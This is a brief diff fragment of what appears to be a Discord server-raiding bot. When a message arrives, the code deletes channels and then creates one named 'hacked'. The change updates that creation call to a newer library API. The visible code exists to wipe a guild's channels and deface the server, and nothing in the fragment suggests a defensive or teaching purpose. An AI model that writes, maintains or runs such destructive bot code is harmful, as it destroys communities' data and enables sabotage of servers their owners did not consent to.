@@ -46,7 +46,7 @@ client.on("message", async msg => {
             c.delete()
         })
 
-    await msg.guild.createChannel("hacked", {
+    await msg.guild.channels.create("hacked", {
       type: "text"
     });
       await msg.guild
